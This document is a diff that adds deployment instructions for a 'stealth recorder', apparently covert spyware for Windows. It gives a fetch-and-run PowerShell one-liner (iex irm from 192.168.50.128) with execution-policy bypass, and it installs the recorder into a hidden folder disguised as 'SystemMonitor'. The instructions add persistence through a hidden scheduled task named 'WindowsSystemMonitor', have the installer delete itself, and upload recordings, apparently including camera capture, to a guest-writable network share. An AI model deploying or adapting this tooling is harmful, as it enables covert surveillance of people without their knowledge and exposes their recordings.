@@ -1,0 +1,123 @@
+===============================================================================
+                    STEALTH RECORDER DEPLOYMENT INSTRUCTIONS
+===============================================================================
+
+PREREQUISITES ON TARGET MACHINE:
+- Windows 10/11
+- Internet connection (for Python download if not installed)
+- Network access to 192.168.50.128 (for recording upload)
+
+-------------------------------------------------------------------------------
+OPTION 1: COPY FILES AND RUN
+-------------------------------------------------------------------------------
+
+1. Copy these files to the target machine:
+   - deploy.ps1
+   - deploy.bat
+
+2. Double-click deploy.bat (or run deploy.ps1 directly)
+
+3. Wait for deployment to complete (~2-5 minutes for Python install)
+
+4. The window will auto-close after 10 seconds on success
+
+5. The script self-destructs after deployment
+
+-------------------------------------------------------------------------------
+OPTION 2: ONE-LINER (Remote Execution)
+-------------------------------------------------------------------------------
+
+If you host deploy.ps1 on a web server (e.g., http://192.168.50.128/deploy.ps1),
+you can run this one-liner on the target machine:
+
+PowerShell:
+  iex (irm http://192.168.50.128/deploy.ps1)
+
+CMD:
+  powershell -ExecutionPolicy Bypass -Command "iex (irm http://192.168.50.128/deploy.ps1)"
+
+-------------------------------------------------------------------------------
+WHAT GETS INSTALLED
+-------------------------------------------------------------------------------
+
+Location: %LOCALAPPDATA%\SystemMonitor\ (hidden folder)
+  - monitor.pyw      : The recorder script (hidden)
+  - cache\           : Local recording cache before upload
+
+Task Scheduler:
+  - Task Name: WindowsSystemMonitor
+  - Triggers: On user logon
+  - Hidden: Yes
+  - Restarts on failure: Yes
+
+-------------------------------------------------------------------------------
+NETWORK SHARE SETUP (ON 192.168.50.128)
+-------------------------------------------------------------------------------
+
+1. Create a shared folder named "Recordings"
+   
+   Windows:
+   - Create folder: E:\Recordings
+   - Right-click > Properties > Sharing > Share
+   - Set permissions: Everyone = Read/Write
+   
+   Linux (Samba):
+   [Recordings]
+     path = /srv/recordings
+     writable = yes
+     guest ok = yes
+     create mask = 0777
+     directory mask = 0777
+
+2. Verify access from client:
+   - Open: \\192.168.50.128\Recordings
+   - Should be able to create files
+
+-------------------------------------------------------------------------------
+VERIFICATION
+-------------------------------------------------------------------------------
+
+To verify recording is working:
+
+1. Check if process is running:
+   PowerShell: Get-Process pythonw -ErrorAction SilentlyContinue
+
+2. Check local cache for recordings:
+   dir %LOCALAPPDATA%\SystemMonitor\cache\
+
+3. Check network share:
+   dir \\192.168.50.128\Recordings\%USERNAME%\
+
+-------------------------------------------------------------------------------
+UNINSTALL
+-------------------------------------------------------------------------------
+
+To completely remove:
+
+1. Stop the process:
+   taskkill /f /im pythonw.exe
+
+2. Remove scheduled task:
+   schtasks /delete /tn WindowsSystemMonitor /f
+
+3. Delete installation folder:
+   rmdir /s /q "%LOCALAPPDATA%\SystemMonitor"
+
+-------------------------------------------------------------------------------
+TROUBLESHOOTING
+-------------------------------------------------------------------------------
+
+Q: Python installation fails?
+A: Run as Administrator, or manually install Python 3.11 first
+
+Q: Network share not accessible?
+A: Files will queue in local cache and upload when connection restored
+
+Q: Recording not starting?
+A: Check %LOCALAPPDATA%\SystemMonitor\cache\service.log for errors
+
+Q: High CPU usage?
+A: Normal during first minute. Should settle to <5% after cameras init
+
+===============================================================================
+
